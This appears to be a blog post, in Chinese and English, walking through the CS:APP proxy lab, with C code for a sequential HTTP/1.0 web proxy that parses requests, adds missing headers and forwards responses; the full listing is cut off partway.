alt="image-20240819181935660"></p><p>实现顺序web代理</p><p>1、在main()里面创建一个监听描述符listenfd，然后在while的循环体里不断尝试与客户端进行连接connfd&#x3D;Accept(listenfd)。连接成功后将connfd传入请求处理函数handleRequest()中。</p><p>2、进入handRequest()后，分别创建好两个I&#x2F;O缓冲区rio_Proxy2Client和rio_Proxy2Server，Proxy可以利用这两个不同的缓冲区分别和Client与Server进行读写操作。</p><p>3、利用rio_Proxy2Client读入http-request，并把这个请求分割成writeup要求的几部分，即method、uri、version；其中url又可以分割为hostName、port和fielName。</p><p>4、处理完request的第一行后，开始处理后序的四个request header，少哪个header就自己补上哪个header。</p><pre class="line-numbers language-none"><code class="language-none">Client-&gt; Proxy GET http:&#x2F;&#x2F;www.cmu.edu:8080&#x2F;hub&#x2F;index.html HTTP&#x2F;1.1Proxy Prase:GET &#x2F;hub&#x2F;index.html HTTP1.1Host: www.cmu.eduport: 8080User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:10.0.3) Gecko&#x2F;20120305 Firefox&#x2F;10.0.3Connection: closeProxy-Connection: closeProxy-&gt;Tiny Sever<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5、Proxy利用刚才得到的hostName和port，调用clientfd&#x3D;Open_clientfd()冒充一个Client与Server建立连接。</p><p>6、Proxy利用clientfd和rio_Proxy2Server，先把从Client处得到的http-request发送给Server，然后不断读入Server回复的response。Proxy在读入response的同时，又利用connfd把它们发送给Client。</p><p>7、还得加上一个如果method不是“GET”的错误处理函数，直接照着书上的敲一遍或者把tiny.c的那个clientError()复制过来就行。</p><p><strong>Hints</strong></p><blockquote><p>• As discussed in Section 10.11 of your textbook, using standard I&#x2F;O functions for socket input and output is a problem. Instead, we recommend that you use the Robust I&#x2F;O (RIO) package, which is provided in the csapp.c file in the handout directory.<br>• The error-handling functions provide in csapp.c are not appropriate for your proxy because once a server begins accepting connections, it is not supposed to terminate. You’ll need to modify them or write your own.<br>• You are free to modify the files in the handout directory any way you like. For example, for the sake of good modularity, you might implement your cache functions as a library in files called cache.c and cache.h. Of course, adding new files will require you to update the provided Makefile.</p><p>• As discussed in the Aside on page 964 of the CS:APP3e text, your proxy must ignore SIGPIPE signals and should deal gracefully with write operations that return EPIPE errors.<br>• Sometimes, calling read to receive bytes from a socket that has been prematurely closed will cause read to return -1 with errno set to ECONNRESET. Your proxy should not terminate due to this error either.<br>• Remember that not all content on the web is ASCII text. Much of the content on the web is binary data, such as images and video. Ensure that you account for binary data when selecting and using functions for network I&#x2F;O.<br>• Forward all requests as HTTP&#x2F;1.0 even if the original request was HTTP&#x2F;1.1.<br>Good luck!</p></blockquote><p>只用搞定HTTP&#x2F;1.0 GET请求</p><p>将HTTP&#x2F;1.1的version信息换成HTTP&#x2F;1.0</p><blockquote><p>Note that all lines in an HTTP request end with a carriage return, ‘\r’, followed by a newline, ‘\n’. Also<br>important is that every HTTP request is terminated by an empty line: “\r\n”.</p></blockquote><h4 id="1-main"><a href="#1-main" class="headerlink" title="1. main"></a>1. <code>main</code></h4><p><strong>Purpose</strong>: The entry point of the program. It initializes the server, listens for incoming connections, and handles each request.</p><p><strong>Implementation</strong>:</p><ul><li><p><strong>Command-Line Argument Check</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"usage: %s &lt;port>\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Ensures the user has provided exactly one argument (the port number). If not, it prints a usage message and exits the program.</p></li><li><p><strong>Open Listening Socket</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">listenfd <span class="token operator">=</span> <span class="token function">Open_listenfd</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Initializes a listening socket on the specified port.</p></li><li><p><strong>Main Loop</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    clientlen <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>clientaddr<span class="token punctuation">)</span><span class="token punctuation">;</span>    connfd <span class="token operator">=</span> <span class="token function">Accept</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">,</span> <span class="token punctuation">(</span>SA <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>clientaddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>clientlen<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Getnameinfo</span><span class="token punctuation">(</span><span class="token punctuation">(</span>SA <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>clientaddr<span class="token punctuation">,</span> clientlen<span class="token punctuation">,</span> hostname<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">,</span> port<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Accepted connection from (%s, %s)\n"</span><span class="token punctuation">,</span> hostname<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">handleRequest</span><span class="token punctuation">(</span>connfd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Close</span><span class="token punctuation">(</span>connfd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Continuously accepts connections from clients. For each accepted connection, it prints the client’s address, calls <code>handleRequest</code> to process the request, and then closes the connection.</p></li></ul><h4 id="2-handleRequest"><a href="#2-handleRequest" class="headerlink" title="2. handleRequest"></a>2. <code>handleRequest</code></h4><p><strong>Purpose</strong>: Handles HTTP requests from clients, forwards them to the target server, and sends the response back to the client.</p><p><strong>Implementation</strong>:</p><ul><li><p><strong>Initialize I&#x2F;O</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">Rio_readinitb</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rio<span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Initializes the <code>rio</code> structure for reading from the client connection.</p></li><li><p><strong>Read Request Line</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">Rio_readlineb</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rio<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"empty request\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Reads the request line from the client into the <code>buf</code> buffer. If the request is empty, it prints a message and returns.</p></li><li><p><strong>Replace HTTP Version</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">replaceHTTPVersion</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>the function</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>pos <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pos <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"HTTP/1.1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    buf<span class="token punctuation">[</span>pos <span class="token operator">-</span> buf <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"HTTP/1.1"</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'0'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Converts the HTTP version from 1.1 to 1.0.</p></li><li><p><strong>Parse Request Line</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">parseLine</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> method<span class="token punctuation">,</span> uri<span class="token punctuation">,</span> version<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Parses the request line to extract HTTP method, URI, version, host, port, and filename.</p></li><li><p><strong>Check Method</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token string">"GET"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">clientError</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> method<span class="token punctuation">,</span> <span class="token string">"501"</span><span class="token punctuation">,</span> <span class="token string">"Not Implemented"</span><span class="token punctuation">,</span> <span class="token string">"Tiny does not implement this method"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Checks if the HTTP method is GET. If not, it sends a 501 Not Implemented error response and returns.</p></li><li><p><strong>Build and Send Request</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> rv <span class="token operator">=</span> <span class="token function">MakeClientRequest</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rio<span class="token punctuation">,</span> clientRequest<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> method<span class="token punctuation">,</span> uri<span class="token punctuation">,</span> version<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>rv <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Calls <code>MakeClientRequest</code> to format the request for the target server. If formatting fails, it returns.</p></li><li><p><strong>Handle Server Response</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> clientfd <span class="token operator">=</span> <span class="token function">Open_clientfd</span><span class="token punctuation">(</span>hostName<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Rio_readinitb</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>riotiny<span class="token punctuation">,</span> clientfd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Rio_writen</span><span class="token punctuation">(</span>riotiny<span class="token punctuation">.</span>rio_fd<span class="token punctuation">,</span> clientRequest<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>clientRequest<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> tinyResponse<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">Rio_readnb</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>riotiny<span class="token punctuation">,</span> tinyResponse<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">Rio_writen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> tinyResponse<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Opens a connection to the target server, sends the formatted request, and then reads the response from the server and writes it back to the client.</p></li></ul><h4 id="3-MakeClientRequest"><a href="#3-MakeClientRequest" class="headerlink" title="3. MakeClientRequest"></a>3. <code>MakeClientRequest</code></h4><p><strong>Purpose</strong>: Constructs the HTTP request to be sent to the target server based on the client’s request.</p><p><strong>Implementation</strong>:</p><ul><li><p><strong>Initialize Request</strong>:</p></li><li><p>注意换行符是<code>\r\n</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span>clientRequest<span class="token punctuation">,</span> <span class="token string">"GET %s HTTP/1.0\r\n"</span><span class="token punctuation">,</span> fileName<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Initializes the request with the method (GET), the file name, and HTTP version 1.0.</p></li><li><p><strong>Read and Process Headers</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">n <span class="token operator">=</span> <span class="token function">Rio_readlineb</span><span class="token punctuation">(</span>rio<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>clientRequest<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>findp <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"User-Agent:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> UserAgent <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>findp <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"Proxy-Connection:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> ProxyConnection <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>findp <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"Connection:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> Connection <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>findp <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"Host:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> HostInfo <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        n <span class="token operator">=</span> <span class="token function">Rio_readlineb</span><span class="token punctuation">(</span>rio<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Reads headers from the client request and appends them to <code>clientRequest</code>. It also checks for specific headers like <code>User-Agent</code>, <code>Proxy-Connection</code>, <code>Connection</code>, and <code>Host</code>.</p></li><li><p><strong>Add Missing Headers</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>HostInfo <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"Host: %s\r\n"</span><span class="token punctuation">,</span> Host<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>clientRequest<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>UserAgent <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">strcat</span><span class="token punctuation">(</span>clientRequest<span class="token punctuation">,</span> user_agent_hdr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Connection <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"Connection: close\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">strcat</span><span class="token punctuation">(</span>clientRequest<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>ProxyConnection <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"Proxy-Connection: close\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">strcat</span><span class="token punctuation">(</span>clientRequest<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Adds missing headers like <code>Host</code>, <code>User-Agent</code>, <code>Connection</code>, and <code>Proxy-Connection</code> if they were not provided by the client.</p></li><li><p><strong>Terminate Request</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">strcat</span><span class="token punctuation">(</span>clientRequest<span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Adds a terminator for the HTTP request to indicate the end of the request headers.</p></li></ul><h4 id="4-replaceHTTPVersion"><a href="#4-replaceHTTPVersion" class="headerlink" title="4. replaceHTTPVersion"></a>4. <code>replaceHTTPVersion</code></h4><p><strong>Purpose</strong>: Replaces HTTP version 1.1 with 1.0 in the request line.</p><p><strong>Implementation</strong>:</p><ul><li><strong>Find and Replace</strong>:<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>pos <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pos <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"HTTP/1.1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    buf<span class="token punctuation">[</span>pos <span class="token operator">-</span> buf <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"HTTP/1.1"</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'0'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>Searches for “HTTP&#x2F;1.1” in the buffer and replaces it with “HTTP&#x2F;1.0”.</li></ul><h4 id="5-parseLine"><a href="#5-parseLine" class="headerlink" title="5. parseLine"></a>5. <code>parseLine</code></h4><p><strong>Purpose</strong>: Parses the request line to extract method, URI, version, host, port, and filename.</p><p><strong>Implementation</strong>:</p><ul><li><p><strong>Parse Request Line</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">sscanf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"%s %s %s"</span><span class="token punctuation">,</span> method<span class="token punctuation">,</span> uri<span class="token punctuation">,</span> version<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Uses <code>sscanf</code> to extract the HTTP method, URI, and version from the request line.</p></li><li><p><strong>Extract Host, Port, and Filename</strong>:</p></li><li><p><code>WEB_PREFIX=&quot;http://&quot;</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>hostp <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>uri<span class="token punctuation">,</span> WEB_PREFIX<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>WEB_PREFIX<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>slash <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>hostp<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>colon <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>hostp<span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strncpy</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> hostp<span class="token punctuation">,</span> slash <span class="token operator">-</span> hostp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strncpy</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> colon <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> slash <span class="token operator">-</span> colon <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> slash<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Extracts the host, port, and file path from the URI. </p><p>the host include the port</p></li></ul><h4 id="6-clientError"><a href="#6-clientError" class="headerlink" title="6. clientError"></a>6. <code>clientError</code></h4><p><strong>Purpose</strong>: Generates and sends an HTTP error response to the client.</p><p><strong>Implementation</strong>:</p><ul><li><p><strong>Build and Send Response Headers</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"HTTP/1.0 %s %s\r\n"</span><span class="token punctuation">,</span> errnum<span class="token punctuation">,</span> shortmsg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Rio_writen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"Content-type: text/html\r\n\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Rio_writen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Creates the HTTP status line and content type header, then sends them to the client.</p></li><li><p><strong>Build and Send Response Body</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"&lt;html>&lt;title>Tiny Error&lt;/title>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Rio_writen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"&lt;body bgcolor=\"ffffff\">\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Rio_writen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"%s: %s\r\n"</span><span class="token punctuation">,</span> errnum<span class="token punctuation">,</span> shortmsg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Rio_writen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"&lt;p>%s: %s\r\n"</span><span class="token punctuation">,</span> longmsg<span class="token punctuation">,</span> cause<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Rio_writen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"&lt;hr>&lt;em>The Tiny Web server&lt;/em>\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Rio_writen</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Creates and sends the HTML content of the error page, including the error number, short message, and detailed message.</p></li></ul><h4 id="完整代码："><a href="#完整代码：" class="headerlink" title="完整代码："></a>完整代码：</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &quot;csapp.h&quot;&#x2F;* Recommended max cache and object sizes *&#x2F;#define MAX_CACHE_SIZE 1049000#define MAX_OBJECT_SIZE 102400#define WEB_PREFIX &quot;http:&#x2F;&#x2F;&quot;&#x2F;* You won&#39;t lose style points for including this long line in your code *&#x2F;static const char *user_agent_hdr &#x3D; &quot;User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:10.0.3) Gecko&#x2F;20120305 Firefox&#x2F;10.0.3\r\n&quot;;void handleRequest(int);void clientError(int , char* , char* , char* , char* );int MakeClientRequest(rio_t* , char* , char*, char* , char* , char* , char*, char*);int checkGetMethod(char* , char* , char* );void replaceHTTPVersion(char* );void parseLine(char* , char*, char* , char* , char* , char*, char*);int main(int argc,char **argv)&#123;    int listenfd,connfd;    char hostname[MAXLINE],port[MAXLINE];    socklen_t clientlen;    struct sockaddr_storage clientaddr;    &#x2F;&#x2F;判断是否是两个命令    if(argc!&#x3D;2)&#123;        fprintf(stderr,&quot;usage: Fuck ,can you input only two string ?\nsuch as%s &lt;port&gt;\n&quot;, argv[0]);       &#x2F;&#x2F; printf(&quot;Fuck ,input right message \n&quot;);        exit(1);    &#125;    listenfd &#x3D;Open_listenfd(argv[1]);   &#x2F;&#x2F;listen a port    